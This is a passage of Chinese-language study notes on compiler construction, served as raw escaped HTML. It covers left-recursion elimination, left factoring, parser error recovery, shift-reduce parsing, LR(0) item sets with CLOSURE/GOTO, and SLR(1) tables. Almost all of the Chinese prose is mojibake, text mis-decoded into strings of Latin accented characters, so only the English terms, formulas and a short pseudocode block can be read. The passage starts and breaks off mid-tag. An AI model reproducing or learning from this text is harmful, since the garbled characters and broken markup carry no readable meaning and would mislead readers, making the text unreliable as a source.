é—®å·å¤„å†…å®¹ç”±é¢„æµ‹åˆ†æè¡¨Må†³å®šï¼Œè¯»è€…æœ‰å…´è¶£å¯ä»¥å¸®å¿™éªŒè¯ä¸€ä¸‹è¿™ä¸ªæ–‡æ³•æ˜¯å¦LL(1)</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>éé€’å½’ä¸‹é™ï¼ˆ<strong>æ— éœ€æŒæ¡</strong>ï¼‰</p>\n<ul>\n<li>æœ¬è´¨ä¸Šè¿˜æ˜¯é€’å½’ä¸‹é™ï¼Œåªæ˜¯æ”¹å†™æˆPushdown Automataæ‰€ä»¥ç›¸å½“äºæ¨¡æ‹Ÿä¸€ä¸ªæ ˆ</li>\n<li>å¦‚æœæ ˆé¡¶æ˜¯éç»ˆç»“ç¬¦Aï¼šåˆ©ç”¨é¢„æµ‹åˆ†æè¡¨,é€‰æ‹©äº§ç”Ÿå¼A -&gt; aï¼ˆä¹Ÿå°±æ˜¯å°†æ ˆé¡¶çš„éç»ˆç»“ç¬¦Aæ›¿æ¢æˆä¸²aï¼‰</li>\n<li>å¦‚æœæ ˆé¡¶æ˜¯ç»ˆç»“ç¬¦aï¼šå°†æ ˆé¡¶è®°å·aå’Œè¾“å…¥ä¸­çš„TokenåŒ¹é…å¹¶å‡ºæ ˆ</li>\n<li>åˆæ€ï¼šå‹å…¥åˆå§‹ç¬¦å·</li>\n<li>ç»ˆæ€ï¼šè¾“å…¥è¯»å–å®Œæ¯•ï¼Œæ ˆç©ºï¼Œæ­¤æ—¶æ¥å—</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"æ¶ˆé™¤å·¦é€’å½’ã€æå·¦å…¬å› å­\"><a href=\"#æ¶ˆé™¤å·¦é€’å½’ã€æå·¦å…¬å› å­\" class=\"headerlink\" title=\"æ¶ˆé™¤å·¦é€’å½’ã€æå·¦å…¬å› å­\"></a>æ¶ˆé™¤å·¦é€’å½’ã€æå·¦å…¬å› å­</h3><ol>\n<li><p>LL(1)æ–‡æ³•çš„éƒ¨åˆ†æ€§è´¨<br>å¯ç”¨äºåˆ¤å®šé—®é¢˜ã€‚</p>\n<ul>\n<li>LL(1)æ–‡æ³•æ˜¯æ— äºŒä¹‰çš„</li>\n<li>LL(1)æ–‡æ³•æ˜¯æ— å·¦é€’å½’çš„</li>\n<li>LL(1)æ–‡æ³•æ˜¯æ— å·¦å…¬å› å­çš„</li>\n</ul>\n</li>\n<li><p>å·¦é€’å½’(left-recursive)æ–‡æ³•:</p>\n<ul>\n<li><p>æœ‰éç»ˆç»“ç¬¦Aä½¿å¾— $A \\Rightarrow^* A\\alpha$</p>\n</li>\n<li><p>å½¢å¦‚ $S\\rightarrow Sa$ çš„ç§°ä¸ºç›´æ¥&#x2F;ç«‹å³å·¦é€’å½’</p>\n</li>\n<li><p>é—®é¢˜ï¼šè¿™ä¼šå¯¼è‡´é€’å½’ä¸‹é™åˆ†æè¿›å…¥æ— é™å¾ªç¯</p>\n<ul>\n<li>$S\\rightarrow Sa|b$ åˆ†æ $baaaa$</li>\n<li>å¯èƒ½æ°¸è¿œå¡åœ¨â€aâ€é‡Œè€Œæ²¡æœºä¼šè€ƒè™‘â€bâ€: $ S \\Rightarrow Sa \\Rightarrow Saa \\Rightarrow Saaa \\Rightarrow Saaaa â€¦$</li>\n</ul>\n</li>\n<li><p>è§£å†³åŠæ³•ï¼šé€šè¿‡æ–‡æ³•å˜æ¢æ¶ˆé™¤ï¼ˆè¯¦è§é¾™ä¹¦ï¼‰<br>æ¯”å¦‚æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸€æ–‡æ³•ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A -&gt; A a | b (a,bä¸ä»¥Aå¼€å¤´ï¼Œaä¸ä¸ºç©º)</span><br></pre></td></tr></table></figure>\n\n<p>è½¬ä¸ºå³é€’å½’ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A -&gt; b A&#x27;</span><br><span class=\"line\">A&#x27; -&gt; aA&#x27; | Îµ</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><p>å·¦å…¬å› å­çš„(left-factored)æ–‡æ³•:</p>\n<ul>\n<li>$ P \\rightarrow \\alpha \\beta | \\alpha \\gamma$</li>\n<li>é—®é¢˜ï¼šåŒä¸€éç»ˆç»“ç¬¦çš„å¤šä¸ªå€™é€‰å¼å­˜åœ¨å…±åŒå‰ç¼€ï¼Œå¯èƒ½å¯¼è‡´å›æº¯</li>\n<li>è§£å†³åŠæ³•ï¼šé™åˆ¶æ–‡æ³• æˆ– æ–‡æ³•å˜æ¢<ul>\n<li>ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥æå–å·¦å…¬å› å­æ¥â€œæ¨è¿Ÿå†³å®šâ€ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨è¯»å…¥æ›´å¤štokenåè¿›è¡Œå†³ç­–ï¼š<br> æŠŠ<br> $$ P \\rightarrow \\alpha \\beta | \\alpha \\gamma $$<br> å˜æ¢ä¸º<br> $$ P \\rightarrow \\alpha Q \\\\ Q \\rightarrow \\beta | \\gamma $$</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"é”™è¯¯æ¢å¤\"><a href=\"#é”™è¯¯æ¢å¤\" class=\"headerlink\" title=\"é”™è¯¯æ¢å¤\"></a>é”™è¯¯æ¢å¤</h3><p>é”™è¯¯ï¼šè¡¨Mä¸­å¯¹åº”æ ¼æ˜¯ç©ºæ ¼ï¼Œæ²¡æœ‰ä»»ä½•å¯å–çš„äº§ç”Ÿå¼<br>æˆ‘ä»¬ä¸å¸Œæœ›é‡åˆ°é”™è¯¯ç›´æ¥å…¨ç›˜æ”¾å¼ƒï¼Œè€Œæ˜¯ä»¤ParseræŠ¥é”™åï¼Œå°½å¯èƒ½ä»é”™è¯¯ä¸­æ¢å¤å¹¶ç»§ç»­å·¥ä½œï¼Œè¿™æ ·å¯ä»¥ä¸€æ¬¡æ€§å°½å¯èƒ½æŠ¥å‡ºç¨‹åºé‡Œå…¨éƒ¨é”™è¯¯ã€‚</p>\n<p>å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼æ¢å¤ï¼š</p>\n<ul>\n<li>åˆ é™¤ï¼šä¾‹å¦‚ï¼Œå¯ä»¥ä¸€ç›´è·³è¿‡tokenç›´åˆ°é‡åˆ°å½“å‰éç»ˆç»“ç¬¦å¯¹åº”Followé›†ä¸­çš„token</li>\n<li>æ’å…¥ï¼šä¾‹å¦‚ï¼Œå¦‚æœå·¦å³æ‹¬å·ä¸åŒ¹é…ï¼Œæˆ‘ä»¬å¯ä»¥æ’å…¥ä¸€ä¸ªå‡è£…æœ‰</li>\n<li>æ›¿æ¢ï¼šä¾‹å¦‚ï¼Œå˜é‡åé”™è¯¯å¯ä»¥æ›¿æ¢ä¸ºæœ€ç›¸è¿‘çš„å˜é‡å</li>\n</ul>\n<h2 id=\"Part-5-è¯­æ³•åˆ†æ-è‡ªåº•å‘ä¸Š\"><a href=\"#Part-5-è¯­æ³•åˆ†æ-è‡ªåº•å‘ä¸Š\" class=\"headerlink\" title=\"Part 5: è¯­æ³•åˆ†æ - è‡ªåº•å‘ä¸Š\"></a>Part 5: è¯­æ³•åˆ†æ - è‡ªåº•å‘ä¸Š</h2><p>ä»ä¸²wå½’çº¦ä¸ºæ–‡æ³•å¼€å§‹ç¬¦å·Sçš„è¿‡ç¨‹ã€‚è§„çº¦æ—¶ï¼Œä¸€ä¸ªä¸æŸäº§ç”Ÿå¼ä½“<strong>ç›¸åŒ¹é…çš„ç‰¹å®šå­ä¸²</strong>è¢«æ›¿æ¢ä¸ºè¯¥äº§ç”Ÿå¼å¤´éƒ¨çš„<strong>éç»ˆç»“ç¬¦å·</strong>ã€‚</p>\n<p>é—®é¢˜ï¼š</p>\n<ul>\n<li>ä½•æ—¶å½’çº¦(å½’çº¦å“ªäº›ç¬¦å·ä¸²)ï¼Ÿ</li>\n<li>å½’çº¦åˆ°å“ªä¸ªéç»ˆç»“ç¬¦å·ï¼Ÿ</li>\n</ul>\n<p>å›é¡¾LL(1)çš„ä¼˜åŠ¿åŠ£åŠ¿ï¼š</p>\n<ul>\n<li>+ è¿è¡Œé«˜æ•ˆ(çº¿æ€§æ—¶é—´)</li>\n<li>+ é€’å½’å®ç°ç¬¦åˆæ–‡æ³•ç»“æ„ã€é€‚åˆæ‰‹åŠ¨æ„é€ &amp;è‡ªåŠ¨ç”Ÿæˆ</li>\n<li>- èƒ½åˆ†æçš„æ–‡æ³•ç±»å‹å—é™</li>\n</ul>\n<p>æˆ‘ä»¬æå‡ºæ–°æ–‡æ³•ï¼šLR(k)</p>\n<ul>\n<li>è¡¨è¾¾åŠ›: Every LL(k) grammar is also LR(k)</li>\n<li>ä¸è¦æ±‚æ— å·¦å…¬å› å¼</li>\n<li>å¯ä»¥å¤„ç†å·¦é€’å½’æ–‡æ³•</li>\n<li>è¢«å¹¿æ³›é‡‡ç”¨(Yacc, Bison, â€¦)</li>\n<li>â€œLâ€: left-to-right scanning è‡ªå·¦å‘å³æ‰«æ</li>\n<li>â€œRâ€: right-most derivation in reverse æœ€å³æ¨å¯¼çš„é€†</li>\n<li>â€œkâ€: å‘å‰çœ‹çš„å­—ç¬¦çš„ä¸ªæ•°(kçœç•¥æ—¶å–1)</li>\n<li>å­é›†ï¼ˆè¯¦è§<a href=\"#grammars-set\">è¯¥å›¾</a>ï¼‰ï¼šLR(1), LALR(1), SLR, LR(0), â€¦</li>\n</ul>\n<h3 id=\"ç§»è¿›-è§„çº¦-Shift-Reduce\"><a href=\"#ç§»è¿›-è§„çº¦-Shift-Reduce\" class=\"headerlink\" title=\"ç§»è¿›-è§„çº¦ Shift-Reduce\"></a>ç§»è¿›-è§„çº¦ Shift-Reduce</h3><p><strong>è¿™æ˜¯LR(k) Parsing çš„ä¸€èˆ¬æ¨¡å¼ã€‚</strong></p>\n<p>æ ¸å¿ƒæ€æƒ³ï¼šå°†å­—ç¬¦ä¸²ä¸€åˆ†ä¸ºäºŒï¼Œ</p>\n<ul>\n<li>å³ä¾§æ˜¯æœªè¢«parseræ£€æŸ¥è¿‡çš„</li>\n<li>å·¦ä¾§åŒ…å«ç»ˆç»“ç¬¦ä¸éç»ˆç»“ç¬¦<br>æˆ‘ä»¬æ¥ä¸‹æ¥ä¼šä½¿ç”¨â€|â€æ ‡è®°åˆ†å‰²ç‚¹ã€‚</li>\n</ul>\n<p>ä¾‹å¦‚ï¼Œè€ƒè™‘è¯¥æ–‡æ³•ï¼š $ E \\rightarrow E+(E) | \\text{int} $</p>\n<ul>\n<li>æ˜¾ç„¶å¹¶éLL(1)çš„ï¼šå­˜åœ¨å·¦é€’å½’</li>\n</ul>\n<p>æˆ‘ä»¬è€ƒè™‘å¤„ç†å­—ç¬¦ä¸²â€int+(int)+(int)â€ï¼Œåˆ™è¿‡ç¨‹å¦‚ä¸‹ï¼š<br><img src=\"/compiler-construction-principles/sr.png\" alt=\"shift reduce\" loading=\"lazy\"></p>\n<p>å¯è§LRåˆ†æé‡‡ç”¨æœ€å³æ¨å¯¼çš„<strong>é€†è¿‡ç¨‹</strong>ï¼šæœ€å·¦è§„çº¦ã€‚å› æ­¤LRåˆ†æçš„æ¯ä¸€æ­¥éƒ½æ˜¯æœ€å³å¥å‹ã€‚<br>ä¸€èˆ¬å®ç°æ–¹å¼ï¼šé‡‡ç”¨<strong>æ ˆ</strong>è¿›è¡ŒShift-Reduce</p>\n<ul>\n<li>æ ˆï¼šåŒ…å«å·¦ä¾§å­—ç¬¦ä¸²</li>\n<li>è¾“å…¥æµï¼šåŒ…å«å‰©ä½™æœªå¤„ç†çš„å³ä¾§å­—ç¬¦ä¸²</li>\n<li>æ“ä½œï¼š<ul>\n<li>Shift: ä»è¾“å…¥è¯»å…¥ä¸€ä¸ªTerminalå‹å…¥æ ˆ</li>\n<li>Reduce: æ ˆé¡¶çš„å‡ ä¸ªå…ƒç´ æ»¡è¶³æŸæ¡äº§ç”Ÿå¼çš„<strong>RHS(Right hand side)</strong>, åˆ™popè¿™äº›å…ƒç´ å¹¶å‹å…¥äº§ç”Ÿå¼çš„<strong>LHS(Left hand side)</strong></li>\n<li>Error: çˆ†ï¼ç•™å¾…åæ–‡è®¨è®ºã€‚</li>\n<li>Accept: shift â€œ$â€ å¹¶ä¸”æ ˆä¸­åªå‰©ä¸‹æ–‡æ³•çš„å¼€å§‹ç¬¦å·</li>\n</ul>\n</li>\n<li>éœ€è¦è§£å†³çš„é—®é¢˜ï¼š<strong>ä½•æ—¶shift? ä½•æ—¶reduce?</strong><ul>\n<li>è¡¨é©±åŠ¨çš„LRåˆ†æï¼šç±»ä¼¼LLæ–‡æ³•çš„è¡¨ï¼Œä½†è¡Œåˆ—æ„ä¹‰ä¸åŒï¼Œä¸”è¿™ä¸ªè¡¨ä¸€èˆ¬å¾ˆå¤§ï¼ˆè¯¦è§åæ–‡ï¼‰</li>\n</ul>\n</li>\n</ul>\n<p>å‡ ä¸ªæ–‡æ³•çš„åŒ…å«å…³ç³»ï¼ˆä»ç„¶æ˜¯è¯¦è§<a href=\"#grammars-set\">è¯¥å›¾</a>ï¼‰:<br>$ LR(0) \\in SLR(1) \\in LALR(1) \\in LR(1) $</p>\n<h3 id=\"LR-0-Parsing\"><a href=\"#LR-0-Parsing\" class=\"headerlink\" title=\"LR(0) Parsing\"></a>LR(0) Parsing</h3><p>æ ¸å¿ƒæ€æƒ³ï¼šå› ä¸ºéœ€è¦å‡‘å‡ºäº§ç”Ÿå¼RHSï¼Œç»´æŠ¤æ ˆé¡¶å†…å®¹å¯¹äºæ‰€æœ‰äº§ç”Ÿå¼å³ä¾§çš„â€œè¿›åº¦â€ã€‚<br>é¡¹(Item):&#x3D; ä¸€ä¸ªäº§ç”Ÿå¼åŠ ä¸Šåœ¨å…¶ä¸­æŸå¤„çš„ä¸€ä¸ªç‚¹ã€‚</p>\n<p>ä¾‹å¦‚äº§ç”Ÿå¼ $A\\rightarrow XYZ$ æœ‰4ä¸ªItem:</p>\n<ul>\n<li>$A\\rightarrow \\bullet XYZ $</li>\n<li>$A\\rightarrow X\\bullet YZ $</li>\n<li>$A\\rightarrow XY\\bullet Z $</li>\n<li>$A\\rightarrow XYZ \\bullet $</li>\n</ul>\n<p>Itemçš„å«ä¹‰ï¼š</p>\n<ul>\n<li>$ A\\rightarrow \\alpha \\bullet \\beta$: å·²æ‰«æ&#x2F;å½’çº¦åˆ°äº†Î±ï¼Œå¹¶æœŸæœ›åœ¨æ¥ä¸‹æ¥çš„è¾“å…¥ä¸­ç»è¿‡æ‰«æ&#x2F;å½’çº¦å¾—åˆ°Î²ï¼Œç„¶åæŠŠÎ±Î²å½’çº¦åˆ°A</li>\n<li>$ A\\rightarrow \\alpha \\beta \\bullet$: å·²æ‰«æ&#x2F;å½’çº¦å¾—åˆ°äº†Î±Î²ï¼Œæ­¤æ—¶å·²ç»å¯ä»¥æŠŠÎ±Î²å½’çº¦ä¸ºA</li>\n</ul>\n<p><strong>Itemç±»ä¼¼ä¸€ä¸ªæœ‰ç©·è‡ªåŠ¨æœºçš„çŠ¶æ€!</strong></p>\n<ul>\n<li>ä¸€ä¸ªé¡¹è¯»å…¥ä¸€ä¸ªç¬¦å·åå¯ä»¥è½¬å˜ä¸ºå¦ä¸€ä¸ªé¡¹ï¼šä¾‹å¦‚$A\\rightarrow \\bullet XYZ $ è¯»å…¥Xå°±å¯ä»¥è½¬ä¸º $A\\rightarrow X\\bullet YZ $</li>\n<li>æ˜¾ç„¶é¡¹çš„æ•°é‡æ˜¯æœ‰é™çš„ã€‚</li>\n<li>è¿™æ ·çš„æœ‰ç©·è‡ªåŠ¨æœºè¢«ç§°ä¸º<strong>LR(0)è‡ªåŠ¨æœº</strong>ã€‚</li>\n</ul>\n<p>LR(0)Parsingçš„NFA:</p>\n<blockquote>\n<p>âš  NFAåªèƒ½è¯†åˆ«æ­£åˆ™è¯­è¨€REï¼Œç„¶è€ŒRE&lt;LR(0). æ‰€ä»¥è¿™é‡Œçš„NFAåªæ˜¯ç”¨äºè¾…åŠ©è®°å½•æ ˆé¡¶è¯†åˆ«è¿›åº¦ã€‚</p>\n</blockquote>\n<ul>\n<li>æ–°å¢å¼€å§‹ç¬¦å·Sâ€™ï¼Œå¹¶åŠ å…¥äº§ç”Ÿå¼â€ Sâ€™-&gt;S$ â€œ</li>\n<li>NFAèµ·å§‹çŠ¶æ€ï¼š$Sâ€™\\rightarrow \\bullet S$ $</li>\n<li>NFAç»ˆç»“çŠ¶æ€ï¼š$Sâ€™\\rightarrow S\\bullet$ $</li>\n<li>è½¬ç§»ï¼š<ul>\n<li>$A\\rightarrow \\bullet XY $ è¯»å…¥Xå°±å¯ä»¥è½¬ä¸º $A\\rightarrow X\\bullet Y $</li>\n<li>å¯¹äºäº§ç”Ÿå¼ $ X\\rightarrow \\alpha Y \\beta $ ä¸ $Y\\rightarrow \\gamma$ é‚£ä¹ˆ $ X\\rightarrow \\alpha \\bullet Y \\beta $ å¯ä»¥ç›´æ¥è½¬æ¢ï¼ˆÎµ-moveï¼‰åˆ° $ Y \\rightarrow \\bullet \\gamma$ ï¼ˆç›¸å½“äºé€’å½’ä¸‹é™æ³•é‡Œè¿›å…¥ä¸‹ä¸€å±‚é€’å½’ï¼Œä»è€Œåˆ†æå½“å‰äº§ç”Ÿå¼å†…éƒ¨çš„éç»ˆç»“ç¬¦ï¼‰</li>\n</ul>\n</li>\n</ul>\n<p>æˆ‘ä»¬æ›´å¸Œæœ›èƒ½è½¬ä¸ºDFA. å½“ç„¶å¯ä»¥ä½¿ç”¨å­é›†æ„é€ æ³•è½¬æ¢ï¼Œä½†äº‹å®ä¸Šå¯ä»¥ç›´æ¥æ„é€ DFA.<br><img src=\"/compiler-construction-principles/lr-nfa2dfa.png\" alt=\"lr-nfa2dfa\" loading=\"lazy\"></p>\n<p>LR(0)Parsingçš„DFAä¸åˆ†æè¡¨ï¼š</p>\n<ul>\n<li><p>DFAæ„é€ ï¼š</p>\n<ul>\n<li><p>é¡¹é›†é—­åŒ…CLOSURE:&#x3D; a <strong>set</strong> of <strong>items</strong>, è®°ä¸ºI</p>\n</li>\n<li><p>ä»»æ„ç¬¦å·è®°ä¸ºX</p>\n</li>\n<li><p>å¯¹ä»»æ„é¡¹é›†Closure(I)æ±‚æ³•ï¼ˆå…¶å®å°±æ˜¯Îµ-closureï¼‰ï¼š<br>Closure(I) &#x3D;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">repeat</span><br><span class=\"line\">  for any item Aâ†’ Î±â€¢XÎ² in I</span><br><span class=\"line\">    for any production Xâ†’ Î³</span><br><span class=\"line\">      I â† I + &#123;Xâ†’ â€¢Î³&#125; </span><br><span class=\"line\">until I does not change. </span><br><span class=\"line\">return I</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>TL;DR: å¦‚æœâ€Â·â€çš„å³è¾¹æ˜¯éç»ˆç»“ç¬¦Xï¼Œå°±æŠŠXä¸ºLHSçš„äº§ç”Ÿå¼å¯¹åº”çš„åˆå§‹é¡¹åŠ å…¥ã€‚æ³¨æ„è¿™æ˜¯é€’å½’çš„ï¼šåŠ å…¥çš„æ–°åˆå§‹é¡¹å¦‚æœä¹Ÿæœ‰è¿™ä¸ªæƒ…å†µè¿˜å¾—æ¥ç€åŠ ã€‚</p>\n</blockquote>\n</li>\n<li><p>æ¥ä¸‹æ¥çš„æ„é€ æ–¹å¼é€šè¿‡ç±»æ¯”NFA-&gt;DFAçš„å­é›†æ„é€ æ³•æ˜¯æ˜¾ç„¶çš„ï¼š<br>GOTO(I,X):&#x3D; Iæ˜¯ä¸€ä¸ªé¡¹é›†ï¼ŒXæ˜¯ä¸€ä¸ªæ–‡æ³•ç¬¦å·ï¼Œåˆ™GOTO(I,X)å®šä¹‰ä¸ºIä¸­æ‰€æœ‰å½¢å¦‚ $A\\rightarrow \\bullet X \\beta$ çš„é¡¹æ‰€å¯¹åº”çš„æ–°é¡¹ $A\\rightarrow X \\bullet \\beta$ æ„æˆçš„æ–°é›†åˆç”Ÿæˆçš„é—­åŒ…ï¼ˆIæ˜¯çŠ¶æ€ï¼ŒXæ˜¯è½¬ç§»ï¼ŒIé‡Œç¬¦åˆè¦æ±‚ï¼ˆä¹Ÿå°±æ˜¯ä¸‹ä¸€ä¸ªç¬¦å·æ˜¯Xï¼‰çš„äº§ç”Ÿå¼å‰ç§»ä¸€ä½è¶Šè¿‡XåŠ å…¥è½¬ç§»åˆ°çš„æ–°çŠ¶æ€ï¼Œä¸ç¬¦åˆçš„è¢«ä¸¢å¼ƒï¼›å½“ç„¶è€ƒè™‘åˆ°Îµ-movesè¦å†æ±‚ä¸€éæ–°çŠ¶æ€çš„é—­åŒ…ï¼‰<br><img src=\"/compiler-construction-principles/lr-dfa.png\" alt=\"lr-dfa\" loading=\"lazy\"><br><img src=\"/compiler-construction-principles/lr-dfa-eg.png\" alt=\"lr-dfa example\" loading=\"lazy\"></p>\n</li>\n</ul>\n</li>\n<li><p>DFAåˆ°åˆ†æè¡¨<br>åˆ†æè¡¨Tç±»ä¼¼LL(1)ä¸­çš„è¡¨Mï¼Œä½†æ˜¯è¡Œåˆ—çš„å«ä¹‰ä¸å†…å®¹éƒ½å‘ç”Ÿäº†å¾ˆå¤§å˜åŒ–ã€‚</p>\n<ul>\n<li><p>Actionè¡¨é¡¹ï¼š</p>\n<ul>\n<li>æ¯ä¸€è¡Œå¯¹åº”ä¸€ä¸ªçŠ¶æ€i</li>\n<li>æ¯ä¸€åˆ—å¯¹åº”ä¸€ä¸ª<strong>ç»ˆç»“ç¬¦t</strong></li>\n<li>è¡¨ä¸­çš„ä¸€æ ¼T[i,t]ä»£è¡¨è¦åšçš„æ“ä½œactionï¼Œæœ‰ä»¥ä¸‹å‡ ç§å¯èƒ½ï¼š<ul>\n<li>$s_n$ &#x3D; shift n :&#x3D; ä»çŠ¶æ€iç»è¿‡<strong>ç»ˆç»“ç¬¦t</strong>è½¬ç§»åˆ°çŠ¶æ€n. æ­¥éª¤ï¼š<ol>\n<li>ä»è¾“å…¥æµä¸­å–ä¸€ä¸ªç»ˆç»“ç¬¦tå‹å…¥çŠ¶æ€æ ˆ</li>\n<li>å°†nå‹å…¥çŠ¶æ€æ ˆ</li>\n</ol>\n</li>\n<li>$r_k$ &#x3D; reduce k :&#x3D; ç¡®å®šä½¿ç”¨ç¬¬kä¸ªäº§ç”Ÿå¼è¿›è¡Œè§„çº¦ï¼ˆæ­¤æ—¶çŠ¶æ€iæ²¡æœ‰å‡ºè¾¹ï¼‰ã€‚ æ­¥éª¤ï¼š<ol>\n<li>å¼¹å‡ºçŠ¶æ€æ ˆé¡¶çš„å‡ ä¸ªçŠ¶æ€ï¼ˆæ•°é‡å¯¹åº”äº§ç”Ÿå¼#kçš„RHSé•¿åº¦ï¼‰</li>\n<li>ç¬¦å·æ ˆå‹å…¥äº§ç”Ÿå¼#kçš„LHSï¼Œä¹Ÿå³ä¸€ä¸ªéç»ˆç»“ç¬¦X</li>\n<li>æŸ¥è¯¢Gotoè¡¨ï¼ˆè§ä¸‹æ–‡ï¼‰T[i,X]å°†å¯¹åº”çš„ä¸‹ä¸€ä¸ªçŠ¶æ€å‹å…¥çŠ¶æ€æ ˆ</li>\n</ol>\n</li>\n<li>accept :&#x3D; è¯¥çŠ¶æ€åŒ…å« $Sâ€™\\rightarrow S \\bullet $ $, æ¥å—å­—ç¬¦ä¸²ï¼Œè¿è¡Œå®Œæ¯•</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Gotoè¡¨é¡¹ï¼š</p>\n<ul>\n<li>æ¯ä¸€è¡Œå¯¹åº”ä¸€ä¸ªçŠ¶æ€i</li>\n<li>æ¯ä¸€åˆ—å¯¹åº”ä¸€ä¸ª<strong>éç»ˆç»“ç¬¦X</strong></li>\n<li>è¡¨ä¸­çš„ä¸€æ ¼T[i,X]è¡¨æ˜ç»è¿‡<strong>éç»ˆç»“ç¬¦X</strong>ä¸‹ä¸€ä¸ªçŠ¶æ€æ˜¯ä»€ä¹ˆ</li>\n<li>æ ¼ä¸­çš„$g_n$ &#x3D; goto n :&#x3D; ä»çŠ¶æ€iç»è¿‡<strong>éç»ˆç»“ç¬¦X</strong>è½¬ç§»åˆ°çŠ¶æ€n</li>\n</ul>\n</li>\n<li><p><img src=\"/compiler-construction-principles/dfa2table.png\" alt=\"dfa to table\" loading=\"lazy\"></p>\n<blockquote>\n<p>LRå®é™…å®ç°åªæœ‰çŠ¶æ€æ ˆï¼Œç¬¦å·ä¿¡æ¯å¯ä»ç›¸åº”çŠ¶æ€ä¸­è·å–</p>\n</blockquote>\n</li>\n<li><p>ä¸€ä¸ªä¾‹å­ï¼š<br><img src=\"/compiler-construction-principles/lr0-stack-table.png\" alt=\"lr0-stack-table\" loading=\"lazy\"></p>\n</li>\n</ul>\n</li>\n</ul>\n<p>å¦‚ä½•ç†è§£â€LR(0)â€ä¸­çš„â€0â€:</p>\n<ul>\n<li>Itemä¸­æ²¡æœ‰Lookahead terminalç­‰ä¿¡æ¯ï¼Œä¸å…³å¿ƒåé¢çš„token</li>\n<li>æ˜¯å¦è§„çº¦&#x2F;ä½¿ç”¨ä½•äº§ç”Ÿå¼è§„çº¦å®Œå…¨å–å†³äºæ ˆé¡¶çŠ¶æ€</li>\n</ul>\n<p><strong>å±€é™æ€§</strong>ï¼šç”±äºåªè¦æœ‰äº§ç”Ÿå¼èƒ½è§„çº¦å°±ç«‹åˆ»è§„çº¦ï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿå†²çªï¼ˆä¹Ÿå°±æ˜¯è¡¨ä¸­ä¸€æ ¼æœ‰å¤šä¸ª$s_n$,$r_n$ï¼Œä¸çŸ¥é“åº”è¯¥ç›´æ¥è§„çº¦è¿˜æ˜¯éœ€è¦æ¥å—æ›´å¤šç¬¦å·æ¥å®Œæˆå¦ä¸€ä¸ªäº§ç”Ÿå¼ï¼Œè¿™è¢«ç§°ä½œ<strong>shift-reduce conflict</strong>ï¼‰<br>æˆ‘ä»¬å¼•å…¥æ–°çš„æ–‡æ³•ï¼Œæ”¾å®½ä¸€äº›é™åˆ¶ã€‚</p>\n<h3 id=\"SLR-1-Parsing\"><a href=\"#SLR-1-Parsing\" class=\"headerlink\" title=\"SLR(1) Parsing\"></a>SLR(1) Parsing</h3><p>SLR(1) &#x3D; Simple LR(1)</p>\n<p>æˆ‘ä»¬è¯´è¿‡kçœç•¥æ—¶é»˜è®¤ä¸º1ï¼Œæ‰€ä»¥ç§°ä¸ºSLRæ–‡æ³•å³å¯ã€‚å…¶å®å°±æ˜¯LR(0)ç¨å¾®æ”¹æ”¹ã€‚</p>\n<p>è€ƒè™‘æ¯æ¬¡è§„çº¦ï¼Œéƒ½ä¼šä½¿ç”¨ä¸€ä¸ªäº§ç”Ÿå¼ $E\\rightarrow \\alpha$<br>â€œLRåˆ†ææ˜¯æœ€å³æ¨å¯¼çš„é€†è¿‡ç¨‹â€ï¼Œå› æ­¤æ¯æ­¥å½’çº¦éƒ½åº”è¯¥æ»¡è¶³ï¼š<br>$$ t \\in \\text{Follow}(E) $$å…¶ä¸­tæŒ‡çš„æ˜¯<strong>è¾“å…¥æµä¸­ä¸‹ä¸€ä¸ªtoken</strong>, EæŒ‡çš„æ˜¯ç”¨äº<strong>æ­¤è§„çº¦ç”¨åˆ°çš„äº§ç”Ÿå¼çš„å·¦éƒ¨(LHS)</strong>.<br>å› æ­¤å¯¹äºSLRæ–‡æ³•æ¥è¯´ï¼ŒSLRçš„DFAå’ŒLR(0)ä¸€æ ·ï¼›ä½†LR(0)çš„åˆ†æè¡¨ä¸­æœ‰ä¸€äº›$r_n$æ˜¯éæ³•çš„ï¼Œéœ€è¦åˆ å»ã€‚<br>åœ¨ç”Ÿæˆåˆ†æè¡¨çš„å…·ä½“æ­¥éª¤ä¸Šï¼š</p>\n<ul>\n<li>LR(0)çš„æŸäº›çŠ¶æ€åŒ…å«å¯è§„çº¦çš„Itemï¼Œé‚£ä¹ˆè¿™ä¸ªçŠ¶æ€Iåœ¨å¯¹åº”çš„Actionè¡¨ä¸­T[I,_]è¿™ä¸€è¡Œçš„æ¯ä¸€ä¸ªæ ¼å­ï¼ˆæ— è®ºç»ˆç»“ç¬¦tæ˜¯ä»€ä¹ˆï¼‰æ— è®ºå¦‚ä½•éƒ½ä¼šæœ‰å¯¹åº”çš„$r_n$é¡¹</li>\n<li>SLRä¼šå…³å¿ƒåé¢çš„ç»ˆç»“ç¬¦æ˜¯ä»€ä¹ˆï¼Œå› æ­¤å¦‚æœtä¸åœ¨Followé›†ä¸­ï¼Œè¿™ä¸èƒ½æ˜¯ä¸€ä¸ªåˆæ³•çš„è§„çº¦ï¼ŒActionè¡¨å¯¹åº”çš„tåˆ—å°±ä¸ä¼šæœ‰è¿™ä¸ª$r_n$</li>\n</ul>\n<p>ä¾‹å¦‚ï¼Œå›¾ä¸­è¢«åˆ’å»çš„éƒ¨åˆ†å³ä¸ºä»LR(0)åˆ†æè¡¨åˆ°SLRåˆ†æè¡¨çš„å˜åŒ–ï¼š<br><img 